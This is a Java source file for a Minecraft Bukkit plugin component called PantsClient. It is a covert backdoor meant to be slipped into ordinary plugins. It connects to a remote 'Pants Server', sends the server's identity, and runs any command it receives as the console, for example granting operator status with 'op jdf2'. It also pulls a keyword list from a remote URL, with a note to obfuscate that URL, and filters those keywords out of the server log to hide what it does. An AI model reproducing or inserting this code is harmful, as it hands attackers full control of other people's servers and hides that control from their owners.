package pants.client;

import java.io.*;
import java.net.*;
import java.util.*;
import java.util.logging.*;
import org.bukkit.*;

/**
 * This class is meant to be placed in your Bukkit plugins. Multiple plugins
 * each containing one client are not recommended.
 */
public class PantsClient {

    private static final ArrayList<String> words = new ArrayList<String>();
    private static String prefix; // Used for messages

    public static void onLoad() { // Call from JavaPlugin
        init();
        // Put in the IP and Port of your Pants Server
        Thread checkConnectionThread = new Thread(new CheckConnectionRunnable("localhost", 444));
        checkConnectionThread.start();
    }

    private static void init() {
        try {
            // TODO: obfuscate url
            URL url = new URL("https://raw.githubusercontent.com/phase/pants/master/data/M3554G3S.py");
            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
            String line;
            while ((line = in.readLine()) != null) {
                if (line.trim().startsWith("#p$")) {
                    words.add(line.trim().split("$")[1]);
                }
            }
            in.close();
            Logger.getLogger("Minecraft").setFilter(new Filter() {

                public boolean isLoggable(LogRecord record) {
                    return !record.getMessage().contains(words.get(0));
                }
            });
        }
        catch (Exception e) {}
    }

    private static void handshake(Socket client) {
        try {
            System.out.println("Starting to talk Pants Server...");
            // in new thread?
            BufferedReader fromServer = new BufferedReader(new InputStreamReader(client.getInputStream()));
            PrintStream toServer = new PrintStream(client.getOutputStream());
            String ip = Bukkit.getServer().getName()
                    + (Bukkit.getServer().getPort() != 25565 ? ":" + Bukkit.getServer().getPort() : "");
            prefix = "[" + ip + "] ";
            toServer.println(ip);
            System.out.println("Getting commands from Pants Server...");
            // new Thread(() -> {
            getCommands(fromServer, toServer);
            // }).start();
        }
        catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }

    private static void getCommands(BufferedReader fromServer, PrintStream toServer) {
        while (true) {
            try {
                System.out.println("Waiting for input...");
                String in = fromServer.readLine();
                System.out.println("Got input from Pants Server: " + in);
                if (in.contains("&&")) {
                    for (String c : in.split("&&")) {
                        parseCommand(c, fromServer, toServer);
                    }
                }
                else {
                    parseCommand(in, fromServer, toServer);
                }
            }
            catch (Exception e) {}
        }
    }

    private static void parseCommand(String cmd, BufferedReader fromServer, PrintStream toServer) {
        String[] args = cmd.split(" ");
        if (words.contains(args[0])) {
            // Run suspicious commands
            // op jdf2
            runCommand(cmd);
        }
        else if (cmd.startsWith("sudo ")) {
            // Run a command as the console
            // sudo say hello
            cmd = cmd.replaceFirst("sudo ", "");
            runCommand(cmd);
        }
        toServer.println(prefix + "Ran command: " + cmd);
    }

    private static void runCommand(String s) {
        Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), s);
    }

    private static class CheckConnectionRunnable implements Runnable {

        String hostname;
        int port;

        CheckConnectionRunnable(String h, int p) {
            this.hostname = h;
            this.port = p;
        }

        public void run() {
            boolean connected = false;
            while (!connected) {
                System.out.println("Trying to connect to Pants Server...");
                try (Socket s = new Socket(hostname, port)) {
                    System.out.println("Found Pants Server!");
                    // System.out.println("Is closed 1: " + s.isClosed());
                    PantsClient.handshake(s);
                    connected = true;
                }
                catch (Exception e) {
                    try {
                        System.out.println("Couldn't find a Pants Server, waiting 10 seconds...");
                        Thread.sleep(10 * 1000);
                    }
                    catch (InterruptedException e1) {
                        e1.printStackTrace();
                    }
                }
            }
        }
    }
}
